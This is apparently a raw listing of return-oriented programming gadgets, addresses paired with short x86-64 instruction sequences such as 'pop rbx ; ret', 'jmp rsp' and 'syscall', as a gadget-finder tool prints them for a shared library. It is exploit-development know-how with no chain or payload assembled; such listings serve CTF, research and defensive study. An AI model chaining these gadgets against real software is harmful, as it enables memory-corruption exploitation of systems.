0x00002aaaaac6a84c : xchg eax, edx ; popfq ; cld ; jmp qword ptr [rdx]
0x00002aaaaab583d4 : xchg eax, edx ; push 0x4c000008 ; cmp edx, eax ; jne 0x833ab ; ret
0x00002aaaaab2e94a : xchg eax, edx ; ret 0x12
0x00002aaaaab11fc4 : xchg eax, edx ; ret 0x8348
0x00002aaaaabccf3e : xchg eax, edx ; ret 0x970f
0x00002aaaaab12325 : xchg eax, edx ; ret 0xb60f
0x00002aaaaaba1cf1 : xchg eax, edx ; ret 0xd029
0x00002aaaaabaca19 : xchg eax, edx ; ret 0xd138
0x00002aaaaac1ea4d : xchg eax, edx ; ret 0xf40
0x00002aaaaac571cf : xchg eax, edx ; ret 0xf869
0x00002aaaaac19e57 : xchg eax, edx ; sub eax, edx ; ret
0x00002aaaaac42b60 : xchg eax, esi ; add byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac6b5ad : xchg eax, esi ; add byte ptr [rax], al ; adc al, 0x20 ; jmp 0x1965b9
0x00002aaaaac2ec43 : xchg eax, esi ; add byte ptr [rax], al ; add byte ptr [rax - 0x7f], cl ; ret 0x80
0x00002aaaaaad75ae : xchg eax, esi ; add byte ptr [rdx], al ; xchg dh, ch ; ret 0x88ad
0x00002aaaaac6dcd5 : xchg eax, esi ; add dword ptr [rax], eax ; ret 0xfff6
0x00002aaaaac30a27 : xchg eax, esi ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab800e6 : xchg eax, esi ; cmc ; add byte ptr [rax], al ; ret
0x00002aaaaac5e411 : xchg eax, esi ; cmc ; jmp qword ptr [rbx]
0x00002aaaaac6a590 : xchg eax, esi ; cmpsd dword ptr [rsi], dword ptr [rdi] ; cld ; inc dword ptr [rsi] ; scasb al, byte ptr [rdi] ; cld ; call qword ptr [rsi + 0x26fffcad]
0x00002aaaaab8e43d : xchg eax, esi ; idiv bh ; add rsp, 0x10 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac42c1d : xchg eax, esi ; lock add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac6a598 : xchg eax, esi ; lodsd eax, dword ptr [rsi] ; cld ; jmp qword ptr [rsi]
0x00002aaaaac42b7b : xchg eax, esi ; nop ; add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac6aa84 : xchg eax, esi ; or al, byte ptr [rax] ; add byte ptr [rbp + rbx*4 - 0x18], al ; call rsp
0x00002aaaaabab753 : xchg eax, esi ; pop rbx ; ret
0x00002aaaaac69bb4 : xchg eax, esi ; pop rsi ; cld ; jmp qword ptr [rsi]
0x00002aaaaab08506 : xchg eax, esi ; ret
0x00002aaaaab0b2cc : xchg eax, esi ; ret 0x394c
0x00002aaaaab5f7c4 : xchg eax, esi ; ret 0xc031
0x00002aaaaac59a6c : xchg eax, esi ; ret 0xcd11
0x00002aaaaabf8047 : xchg eax, esi ; ret 0xfb83
0x00002aaaaac42bcc : xchg eax, esi ; rol byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac5871c : xchg eax, esi ; sbb eax, dword ptr [rdx + 0x2ff463c7] ; hlt ; stosb byte ptr [rdi], al ; cli ; ret 0xac65
0x00002aaaaac6a0a0 : xchg eax, esi ; xchg ah, bh ; jmp qword ptr [rsi]
0x00002aaaaac6d2d8 : xchg eax, esp ; adc al, 0xf5 ; call rsp
0x00002aaaaac6d708 : xchg eax, esp ; adc al, 0xf6 ; call rsp
0x00002aaaaac6b208 : xchg eax, esp ; adc ch, dl ; jmp rsp
0x00002aaaaac710cc : xchg eax, esp ; adc dword ptr [rax], eax ; add byte ptr [rax], dl ; jno 0x19c0d7 ; jmp qword ptr [rdi]
0x00002aaaaac6b148 : xchg eax, esp ; add al, 0xea ; call rsp
0x00002aaaaab41948 : xchg eax, esp ; add byte ptr [rax], al ; add byte ptr [rax + 0x63], cl ; add al, 0x86 ; add rax, rsi ; jmp rax
0x00002aaaaabb4be4 : xchg eax, esp ; add byte ptr [rax], al ; add byte ptr [rcx], bh ; ret 0x8f0f
0x00002aaaaac30ba7 : xchg eax, esp ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac84ecc : xchg eax, esp ; add qword ptr [r8], r8 ; loopne 0x1aff48 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaabba0d6 : xchg eax, esp ; and al, 0x20 ; add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab896ac : xchg eax, esp ; and al, 0x80 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabb4be2 : xchg eax, esp ; and al, 0x94 ; add byte ptr [rax], al ; add byte ptr [rcx], bh ; ret 0x8f0f
0x00002aaaaab46867 : xchg eax, esp ; and al, 0xe0 ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7f], cl ; ret
0x00002aaaaac6e8e0 : xchg eax, esp ; and al, 0xf8 ; jmp rsp
0x00002aaaaac6aa09 : xchg eax, esp ; cld ; call rax
0x00002aaaaac6ed04 : xchg eax, esp ; cmc ; add dword ptr [rax], eax ; xor al, 0xdb ; clc ; call rsp
0x00002aaaaac6d408 : xchg eax, esp ; cmc ; jmp rsp
0x00002aaaaac6ce6c : xchg eax, esp ; cmp eax, 0x32b40001 ; jmp rsp
0x00002aaaaac6fb98 : xchg eax, esp ; fdivr st(2) ; jmp rsp
0x00002aaaaac82019 : xchg eax, esp ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac5b374 : xchg eax, esp ; in eax, dx ; in eax, dx ; inc dword ptr [rbx - 0x13] ; in eax, dx ; call qword ptr [rax]
0x00002aaaaac6ad40 : xchg eax, esp ; jg 0x195d2f ; jmp rsp
0x00002aaaaac6f268 : xchg eax, esp ; leave ; stc ; call rsp
0x00002aaaaac6ba64 : xchg eax, esp ; mov bh, 0 ; add byte ptr [rax + rbp*4], dl ; in eax, dx ; call rsp
0x00002aaaaac7b7cc : xchg eax, esp ; mov eax, 0x1e00000 ; out dx, eax ; jmp rsi
0x00002aaaaac6c619 : xchg eax, esp ; out dx, eax ; call rsp
0x00002aaaaac6aeac : xchg eax, esp ; outsd dx, dword ptr [rsi] ; add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; mov ebp, ecx ; jmp rsp
0x00002aaaaac6ef38 : xchg eax, esp ; pop rax ; stc ; jmp rsp
0x00002aaaaabab721 : xchg eax, esp ; pop rbx ; ret
0x00002aaaaac6c0e8 : xchg eax, esp ; push -0x1e630012 ; add byte ptr [rax], al ; push 0xee ; jmp rsp
0x00002aaaaac6e328 : xchg eax, esp ; push rbx ; idiv edi ; pop rsp ; mov bl, 1 ; add byte ptr [rbp + rdx*2 - 9], dh ; call rsp
0x00002aaaaac59c7f : xchg eax, esp ; push rsi ; cli ; push 0x6e ; ja 0x184c10 ; ret 0x48f
0x00002aaaaaaeeed0 : xchg eax, esp ; ret
0x00002aaaaac7c1cc : xchg eax, esp ; ret 0
0x00002aaaaabc19c0 : xchg eax, esp ; ret 0x1589
0x00002aaaaab85b04 : xchg eax, esp ; ret 0x2041
0x00002aaaaab871dd : xchg eax, esp ; ret 0x294c
0x00002aaaaabb71e9 : xchg eax, esp ; ret 0x2fe9
0x00002aaaaab9014d : xchg eax, esp ; ret 0x3840
0x00002aaaaab7306e : xchg eax, esp ; ret 0x3941
0x00002aaaaabf9197 : xchg eax, esp ; ret 0x3945
0x00002aaaaabb83df : xchg eax, esp ; ret 0x3ae9
0x00002aaaaac0b128 : xchg eax, esp ; ret 0x3d83
0x00002aaaaabad1f3 : xchg eax, esp ; ret 0x4422
0x00002aaaaabc20bb : xchg eax, esp ; ret 0x5408
0x00002aaaaab9021a : xchg eax, esp ; ret 0x5438
0x00002aaaaab2e903 : xchg eax, esp ; ret 0x7f3c
0x00002aaaaab55ebe : xchg eax, esp ; ret 0x82e9
0x00002aaaaab1bda9 : xchg eax, esp ; ret 0x8341
0x00002aaaaaafbec5 : xchg eax, esp ; ret 0x8348
0x00002aaaaabe5c5d : xchg eax, esp ; ret 0x840
0x00002aaaaab6bbf7 : xchg eax, esp ; ret 0x8440
0x00002aaaaab7edb5 : xchg eax, esp ; ret 0x8444
0x00002aaaaab6b826 : xchg eax, esp ; ret 0x8445
0x00002aaaaabf1b6c : xchg eax, esp ; ret 0x8545
0x00002aaaaabb64cb : xchg eax, esp ; ret 0x854d
0x00002aaaaabb4fda : xchg eax, esp ; ret 0x8941
0x00002aaaaabb6f15 : xchg eax, esp ; ret 0x8949
0x00002aaaaaaf5777 : xchg eax, esp ; ret 0x8d48
0x00002aaaaabfb152 : xchg eax, esp ; ret 0x93c
0x00002aaaaab21390 : xchg eax, esp ; ret 0x9522
0x00002aaaaabb837b : xchg eax, esp ; ret 0x9848
0x00002aaaaab04458 : xchg eax, esp ; ret 0xb60f
0x00002aaaaabaff91 : xchg eax, esp ; ret 0xc031
0x00002aaaaabf3e15 : xchg eax, esp ; ret 0xc085
0x00002aaaaabb931d : xchg eax, esp ; ret 0xc683
0x00002aaaaabae07f : xchg eax, esp ; ret 0xd009
0x00002aaaaab903b2 : xchg eax, esp ; ret 0xd021
0x00002aaaaab1bdbe : xchg eax, esp ; ret 0xd084
0x00002aaaaabd2e43 : xchg eax, esp ; ret 0xd108
0x00002aaaaaaf586c : xchg eax, esp ; ret 0xd284
0x00002aaaaab7326f : xchg eax, esp ; ret 0xd308
0x00002aaaaab36a96 : xchg eax, esp ; ret 0xd309
0x00002aaaaabb4fd2 : xchg eax, esp ; ret 0xd609
0x00002aaaaab44fbc : xchg eax, esp ; ret 0xdaf7
0x00002aaaaabc0b1d : xchg eax, esp ; ret 0xf0e9
0x00002aaaaab5f848 : xchg eax, esp ; ret 0xf201
0x00002aaaaabb82ef : xchg eax, esp ; ret 0xf44
0x00002aaaaabf1d52 : xchg eax, esp ; ret 0xf741
0x00002aaaaab831d4 : xchg eax, esp ; ret 0xf883
0x00002aaaaaba6f1c : xchg eax, esp ; ret 0xf983
0x00002aaaaab273bf : xchg eax, esp ; ret 0xfa80
0x00002aaaaab7ed17 : xchg eax, esp ; ret 0xfd83
0x00002aaaaab7ed38 : xchg eax, esp ; ret 0xfe83
0x00002aaaaac6e4ec : xchg eax, esp ; ret 1
0x00002aaaaab811bc : xchg eax, esp ; rol bl, 0x90 ; mov eax, 1 ; ret
0x00002aaaaab69920 : xchg eax, esp ; ror byte ptr [rax - 0x7d], 0xc1 ; add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaabccd6f : xchg eax, esp ; ror byte ptr [rax - 0x7d], 0xc4 ; movzx rax, al ; ret
0x00002aaaaac0ece6 : xchg eax, esp ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rdi], cl ; mov dh, 0xc0 ; pop rbx ; pop rbp ; ret
0x00002aaaaab1a3b3 : xchg eax, esp ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rdi], cl ; mov dh, 0xc0 ; ret
0x00002aaaaab40313 : xchg eax, esp ; ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rdi], cl ; mov dh, 0xc0 ; neg eax ; ret
0x00002aaaaac10769 : xchg eax, esp ; ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rdi], cl ; mov dh, 0xc0 ; ret
0x00002aaaaab8fa44 : xchg eax, esp ; ror byte ptr [rdi], 0xb6 ; ror byte ptr [rax - 0x73], 0x14 ; add byte ptr [rax + 1], cl ; ret 0x8d48
0x00002aaaaaba2004 : xchg eax, esp ; ror byte ptr [rdi], 0xb6 ; ror byte ptr [rax - 0x73], 0x44 ; add bh, bh ; ret
0x00002aaaaac0fc59 : xchg eax, esp ; ror byte ptr [rdi], 0xb6 ; ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab0a22a : xchg eax, esp ; ror byte ptr [rdi], 0xb6 ; ror byte ptr [rcx - 0x3fcebfbd], 0x5b ; ret
0x00002aaaaabd2e9a : xchg eax, esp ; sar dword ptr [rax], 0xf ; xchg eax, esp ; ret 0xd108
0x00002aaaaabd2e3e : xchg eax, esp ; sar dword ptr [rsp + rbx*2], 0xf ; xchg eax, esp ; ret 0xd108
0x00002aaaaac6d1b8 : xchg eax, esp ; sbb ah, dh ; dec dword ptr [rsp + rdx*2 + 0x20c40001] ; hlt ; call rsp
0x00002aaaaac6be10 : xchg eax, esp ; sbb esi, ebp ; call rsp
0x00002aaaaac7bf79 : xchg eax, esp ; sti ; call qword ptr [rax]
0x00002aaaaac8f829 : xchg eax, esp ; sti ; jmp qword ptr [rdx]
0x00002aaaaabbeab4 : xchg eax, esp ; sub eax, 0x5a0a8900 ; pop rcx ; pop rbx ; ret
0x00002aaaaac6f3c4 : xchg eax, esp ; sub eax, dword ptr [rdx] ; add byte ptr [rbx + rdi*8 - 7], dl ; jmp rsp
0x00002aaaaac5d118 : xchg eax, esp ; test al, 0xf3 ; call rdi
0x00002aaaaac5d05c : xchg eax, esp ; test al, 0xf3 ; inc dword ptr [rdi - 0x587b000d] ; jmp rax
0x00002aaaaabe8d66 : xchg eax, r8d ; mov eax, dword ptr [r14 + 0x18] ; mov dword ptr [rbp - 0x80], eax ; call r9
0x00002aaaaabe81de : xchg eax, r8d ; mov eax, dword ptr [rbx + 0x60] ; mov dword ptr [rbp - 0x80], eax ; call rcx
0x00002aaaaab5baca : xchg ebp, eax ; add dword ptr [rax], eax ; add byte ptr [rax - 0x39], cl ; ret 0xffdf
0x00002aaaaab7f30e : xchg ebp, ebx ; add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; clc ; add rax, rcx ; ret
0x00002aaaaac85849 : xchg ebp, esi ; jmp rax
0x00002aaaaac905b9 : xchg ebx, edi ; call rcx
0x00002aaaaac80ac9 : xchg ebx, esi ; call qword ptr [rsi]
0x00002aaaaac5cbbd : xchg ebx, esi ; dec dword ptr [rsi + rdi*2 - 0x7ee8000d] ; call qword ptr [rsi]
0x00002aaaaac5cb15 : xchg ebx, esi ; jmp rdx
0x00002aaaaac6f0d1 : xchg ecx, edi ; call rsp
0x00002aaaaac6f0d0 : xchg ecx, r15d ; call rsp
0x00002aaaaabd5f3c : xchg edi, ebp ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabd64bc : xchg edi, esp ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabda2e1 : xchg edx, ecx ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0xbc41
0x00002aaaaabd8edb : xchg edx, edi ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaab1cd65 : xchg esi, ebp ; add byte ptr [rax], al ; add byte ptr [rcx - 0x77], al ; ret 0xc083
0x00002aaaaac6a09d : xchg esp, edi ; call qword ptr [rsi + 0x26fffc86]
0x00002aaaaac6aa25 : xchg esp, edi ; call rax
0x00002aaaaac6a1d9 : xchg esp, edi ; call rsp
0x00002aaaaac6a1d5 : xchg esp, edi ; inc dword ptr [rdi + rax*4 - 4] ; call rsp
0x00002aaaaac6a099 : xchg esp, edi ; inc dword ptr [rsi] ; xchg esp, edi ; call qword ptr [rsi + 0x26fffc86]
0x00002aaaaac6a059 : xchg esp, edi ; jmp qword ptr [rax]
0x00002aaaaac6a05d : xchg esp, edi ; push qword ptr [rax + 0x40fffc86] ; xchg ah, bh ; call rax
0x00002aaaaaba243f : xchg esp, esi ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaac81bf1 : xchg esp, esi ; call qword ptr [rax]
0x00002aaaaac81ba9 : xchg esp, esi ; call qword ptr [rsi]
0x00002aaaaac5d9c9 : xchg esp, esi ; inc dword ptr [rax] ; mov ah, dh ; jmp rdx
0x00002aaaaac6a1d8 : xchg esp, r15d ; call rsp
0x00002aaaaab49f11 : xchg rax, rbp ; add byte ptr [rcx - 0x7cb768f4], cl ; ret 0x4801
0x00002aaaaac6a064 : xchg spl, dil ; call rax
0x00002aaaaab93435 : xlatb ; add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac54679 : xlatb ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x00002aaaaac253c9 : xlatb ; add r9, r11 ; jmp r9
0x00002aaaaab8e881 : xlatb ; add rsp, 0x18 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabc85e9 : xlatb ; call 0x1f8ab
0x00002aaaaabf621a : xlatb ; idiv edi ; add rsp, 0x30 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac6bc39 : xlatb ; in eax, dx ; inc esp ; ret 0
0x00002aaaaabd718e : xlatb ; int1 ; dec dword ptr [rax - 0x75] ; jge 0x10219c ; call rbx
0x00002aaaaabd7173 : xlatb ; int1 ; dec dword ptr [rcx - 0x75] ; call rbx
0x00002aaaaabd719c : xlatb ; int1 ; dec dword ptr [rcx - 0x75] ; cmp al, 0x24 ; call rbx
0x00002aaaaabd7180 : xlatb ; int1 ; dec dword ptr [rcx - 0x75] ; jge 0x10218e ; call rbx
0x00002aaaaabd1242 : xlatb ; ja 0xfc274 ; ret
0x00002aaaaabe95b9 : xlatb ; jmp rax
0x00002aaaaac58243 : xlatb ; jo 0x1832bf ; mov ebp, 0xfb67d10d ; ret
0x00002aaaaab1f772 : xlatb ; mov byte ptr [rsi], al ; jne 0x4a758 ; mov rax, rsi ; ret
0x00002aaaaabf8386 : xlatb ; mov qword ptr [r9], rdi ; ret
0x00002aaaaab2ba9d : xlatb ; ret
0x00002aaaaac596e6 : xlatb ; ret 0x4e27
0x00002aaaaaad8268 : xlatb ; ret 0x5a51
0x00002aaaaab61a17 : xlatb ; ret 0x94c
0x00002aaaaab62d8f : xlatb ; ret 0xc085
0x00002aaaaab5e040 : xlatb ; ret 0xc148
0x00002aaaaab7367b : xlatb ; ret 0xf188
0x00002aaaaab5fbc4 : xlatb ; ret 0xf66
0x00002aaaaab6ab21 : xlatb ; rol byte ptr [rbp + 0x664975c0], 0xf ; xlatb ; ret 0xc085
0x00002aaaaab73516 : xlatb ; rol dword ptr [rbp + 0x317475c0], -0x40 ; ret
0x00002aaaaac39c02 : xlatb ; ror byte ptr [rax - 0x73], 0x76 ; adc byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; call qword ptr [rbx]
0x00002aaaaac39c3e : xlatb ; ror byte ptr [rax - 0x73], 0x76 ; adc byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; ret
0x00002aaaaab75a4f : xlatb ; ror byte ptr [rax - 0x73], 0x76 ; adc byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; ret 0x13
0x00002aaaaab7a4ae : xlatb ; ror byte ptr [rcx - 0x7d], 1 ; ret 0x4d10
0x00002aaaaac3fdbe : xlatb ; ror byte ptr [rdi], 0x28 ; fimul dword ptr [rcx - 0x7d] ; call 0xffffffffc39cbce5
0x00002aaaaac40e3e : xlatb ; ror byte ptr [rdi], 0x28 ; fimul dword ptr [rcx - 0x7d] ; call 0xffffffffc39ccd65
0x00002aaaaac44d16 : xlatb ; ror dword ptr [rcx], cl ; ret 0xe074
0x00002aaaaab73474 : xlatb ; ror dword ptr [rdi], -0x43 ; ror byte ptr [rax + 1], 0xf8 ; ret
0x00002aaaaab5f516 : xlatb ; sal bh, 1 ; ret 0x8000
0x00002aaaaab5f3d6 : xlatb ; sal bh, 1 ; ret 0xc000
0x00002aaaaab5f296 : xlatb ; sal bh, 1 ; ret 0xe000
0x00002aaaaab5f156 : xlatb ; sal bh, 1 ; ret 0xf000
0x00002aaaaab5f016 : xlatb ; sal bh, 1 ; ret 0xf800
0x00002aaaaab5eed6 : xlatb ; sal bh, 1 ; ret 0xfc00
0x00002aaaaab5ed96 : xlatb ; sal bh, 1 ; ret 0xfe00
0x00002aaaaab5ec56 : xlatb ; sal bh, 1 ; ret 0xff00
0x00002aaaaab5eb16 : xlatb ; sal bh, 1 ; ret 0xff80
0x00002aaaaab5e9d6 : xlatb ; sal bh, 1 ; ret 0xffc0
0x00002aaaaab5e896 : xlatb ; sal bh, 1 ; ret 0xffe0
0x00002aaaaab5e756 : xlatb ; sal bh, 1 ; ret 0xfff0
0x00002aaaaab5e616 : xlatb ; sal bh, 1 ; ret 0xfff8
0x00002aaaaab5e4d6 : xlatb ; sal bh, 1 ; ret 0xfffc
0x00002aaaaab5e396 : xlatb ; sal bh, 1 ; ret 0xfffe
0x00002aaaaac44d12 : xlatb ; shl byte ptr [rsi + 0xf], 0xd7 ; ror dword ptr [rcx], cl ; ret 0xe074
0x00002aaaaab619b5 : xlatb ; shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret
0x00002aaaaab619c6 : xlatb ; shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret 0xf66
0x00002aaaaac696b1 : xlatb ; sti ; inc dword ptr [rax - 0x27] ; sti ; jmp qword ptr [rax]
0x00002aaaaac696d1 : xlatb ; sti ; inc dword ptr [rax] ; fsincos ; jmp rax
0x00002aaaaabd16a3 : xlatb ; syscall ; cmp rax, -0x1000 ; ja 0xfc6bb ; ret
0x00002aaaaabd1753 : xlatb ; syscall ; cmp rax, -0x1000 ; ja 0xfc76b ; ret
0x00002aaaaab0af68 : xlatb ; xor eax, eax ; ret
0x00002aaaaab79ca8 : xor ah, ah ; mov byte ptr [rdx + 0x10], ah ; mov rax, rdi ; ret
0x00002aaaaab79c3e : xor ah, ah ; mov byte ptr [rdx + 8], ah ; mov rax, rdi ; ret
0x00002aaaaac69aa5 : xor ah, bh ; call qword ptr [rax]
0x00002aaaaac69a45 : xor ah, bh ; call rax
0x00002aaaaac6971c : xor ah, bl ; sti ; jmp qword ptr [rax]
0x00002aaaaaad75e0 : xor ah, byte ptr [rsi] ; sahf ; jl 0x2579 ; loop 0x25c4 ; ret 0x23cb
0x00002aaaaac11121 : xor al, 0 ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaaae27b0 : xor al, 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x31
0x00002aaaaab51c19 : xor al, 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac755a8 : xor al, 0 ; add byte ptr [rax], al ; cld ; add byte ptr [rax], al ; add al, dh ; mov bl, 0xec ; jmp qword ptr [rcx]
0x00002aaaaac75760 : xor al, 0 ; add byte ptr [rax], al ; sub al, 0x58 ; add byte ptr [rax], al ; sbb dl, cl ; in al, dx ; jmp rax
0x00002aaaaac7d4e0 : xor al, 0 ; add byte ptr [rax], al ; xor al, 0x80 ; add byte ptr [rax], al ; or byte ptr [rcx + rsi*8], bl ; jmp qword ptr [rcx]
0x00002aaaaab51ba6 : xor al, 0 ; add dword ptr [rip + 0x348bb5], 1 ; ret
0x00002aaaaab52b25 : xor al, 0 ; add rsp, 8 ; mov rax, rdx ; pop rbx ; pop rbp ; ret
0x00002aaaaab57335 : xor al, 0 ; mov dword ptr fs:[rax], 0xc ; xor eax, eax ; ret
0x00002aaaaab5602e : xor al, 0 ; mov qword ptr [rsp + 0x10], r8 ; xor edi, edi ; call qword ptr [rax]
0x00002aaaaab528a5 : xor al, 0 ; mov r12, rsi ; xor edi, edi ; mov r13, rdx ; call qword ptr [r15]
0x00002aaaaab5306c : xor al, 0 ; mov rax, qword ptr [rax] ; test rax, rax ; je 0x7e082 ; call rax
0x00002aaaaab5306b : xor al, 0 ; mov rax, qword ptr [rax] ; test rax, rax ; je 0x7e083 ; call rax
0x00002aaaaab55f44 : xor al, 0 ; mov rdi, r14 ; call qword ptr [rax]
0x00002aaaaab51b15 : xor al, 0 ; ret
0x00002aaaaab56169 : xor al, 0 ; xor edi, edi ; call qword ptr [rax]
0x00002aaaaac571ca : xor al, 0x19 ; xchg dword ptr [rcx + 0x79], ecx ; xchg eax, edx ; ret 0xf869
0x00002aaaaab6af3b : xor al, 0x24 ; test rsi, rsi ; jne 0x95f54 ; jmp 0x95f0e
0x00002aaaaac8266c : xor al, 0x27 ; add dword ptr [rax], eax ; nop ; test al, 0xf4 ; jmp qword ptr [rcx]
0x00002aaaaabb28c2 : xor al, 0x2b ; call 0x938c8
0x00002aaaaabd6348 : xor al, 0x2c ; add byte ptr [rcx + 0x5b], bl ; pop rbp ; pop r12 ; ret
0x00002aaaaac7366c : xor al, 0x37 ; add byte ptr [rax], al ; or ch, 0xe9 ; call qword ptr [rdx]
0x00002aaaaab0a303 : xor al, 0x39 ; add byte ptr [rbp - 0xcf98a40], al ; ret
0x00002aaaaaad7051 : xor al, 0x39 ; push rbx ; cmp byte ptr [rdi - 0x19ade7f3], dl ; ret
0x00002aaaaab7359b : xor al, 0x48 ; lea eax, dword ptr [rdi + rax + 0x20] ; ret
0x00002aaaaac43f98 : xor al, 0x55 ; add al, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaabbd5ab : xor al, 0x5b ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaac6f858 : xor al, 0x66 ; cli ; call rsp
0x00002aaaaac6eab0 : xor al, 0x69 ; clc ; call rsp
0x00002aaaaac6fcc8 : xor al, 0x73 ; sti ; call rsp
0x00002aaaaabd07d4 : xor al, 0x75 ; fild word ptr [rcx + 0xf] ; xor byte ptr [rcx], 0xc0 ; ret
0x00002aaaaac7d4e4 : xor al, 0x80 ; add byte ptr [rax], al ; or byte ptr [rcx + rsi*8], bl ; jmp qword ptr [rcx]
0x00002aaaaac6c558 : xor al, 0x80 ; out dx, eax ; inc esp ; add dword ptr [rcx], eax ; add byte ptr [rcx + rax*4], dh ; out dx, eax ; jmp rsp
0x00002aaaaab7f0e1 : xor al, 0x81 ; add rcx, rsi ; jmp rcx
0x00002aaaaac6c560 : xor al, 0x81 ; out dx, eax ; jmp rsp
0x00002aaaaabb9da2 : xor al, 0x83 ; ret 0x4401
0x00002aaaaabbd443 : xor al, 0x89 ; ret 0x4489
0x00002aaaaab0795d : xor al, 0x89 ; ret 0x5525
0x00002aaaaac6f0e0 : xor al, 0x89 ; stc ; ljmp ptr [rdi + rdx + 2] ; add ah, dl ; mov bh, cl ; call rsp
0x00002aaaaab7f0a9 : xor al, 0x90 ; add rax, rsi ; jmp rax
0x00002aaaaac6d280 : xor al, 0x91 ; hlt ; jmp rsp
0x00002aaaaac6c618 : xor al, 0x94 ; out dx, eax ; call rsp
0x00002aaaaac073a8 : xor al, 0x9c ; add eax, 0x5ba00 ; add byte ptr [rax], al ; call 0x2e62b
0x00002aaaaab99724 : xor al, 0xb0 ; add rax, rsi ; jmp rax
0x00002aaaaab996b2 : xor al, 0xb2 ; add rdx, rsi ; jmp rdx
0x00002aaaaababa95 : xor al, 0xb6 ; cmp r8d, esi ; jge 0xd6a78 ; mov edx, eax ; jmp 0xd6a81
0x00002aaaaab41a9f : xor al, 0xb7 ; add rdi, rsi ; jmp rdi
0x00002aaaaab08410 : xor al, 0xb7 ; add rsi, rdi ; jmp rsi
0x00002aaaaac7c16c : xor al, 0xc2 ; add byte ptr [rax], al ; add byte ptr [rbx], ch ; cli ; call qword ptr [rdi]
0x00002aaaaac6e4d4 : xor al, 0xc2 ; add dword ptr [rax], eax ; xor al, 0xe3 ; idiv edi ; ret 1
0x00002aaaaac583aa : xor al, 0xd8 ; ret
0x00002aaaaac7d86c : xor al, 0xd9 ; add byte ptr [rax], al ; and dword ptr [rdi], ebp ; int1 ; jmp qword ptr [rax]
0x00002aaaaac6ed08 : xor al, 0xdb ; clc ; call rsp
0x00002aaaaac6e4d8 : xor al, 0xe3 ; idiv edi ; ret 1
0x00002aaaaac6e528 : xor al, 0xe5 ; idiv edi ; push rsp ; ret
0x00002aaaaab88934 : xor al, 0xe9 ; ret 6
0x00002aaaaac73b01 : xor al, 0xea ; jmp rax
0x00002aaaaac7a631 : xor al, 0xee ; jmp qword ptr [rcx]
0x00002aaaaac5be65 : xor al, 0xf0 ; jmp rax
0x00002aaaaac7f06c : xor al, 0xf1 ; add byte ptr [rax], al ; loopne 0x1aa08d ; call qword ptr [rdx]
0x00002aaaaac8f26c : xor al, 0xf3 ; add dword ptr [rax], eax ; add byte ptr [rsi], dl ; clc ; call qword ptr [rdx]
0x00002aaaaac6c6c8 : xor al, 0xfb ; out dx, eax ; call rsp
0x00002aaaaac6a011 : xor al, 0xfc ; jmp qword ptr [rax + 0x20fffc35]
0x00002aaaaac69a6d : xor al, 0xfc ; jmp qword ptr [rax]
0x00002aaaaac69a8d : xor al, 0xfc ; jmp rax
0x00002aaaaac833c5 : xor al, 1 ; add byte ptr [rax - 0x14], ch ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac833ad : xor al, 1 ; add byte ptr [rax - 0x14], dl ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac83365 : xor al, 1 ; add byte ptr [rax - 0x15], bl ; hlt ; jmp rdx
0x00002aaaaab7ff78 : xor al, 1 ; add byte ptr [rax], al ; ret
0x00002aaaaac83395 : xor al, 1 ; add byte ptr [rax], bh ; in al, dx ; hlt ; jmp qword ptr [rcx]
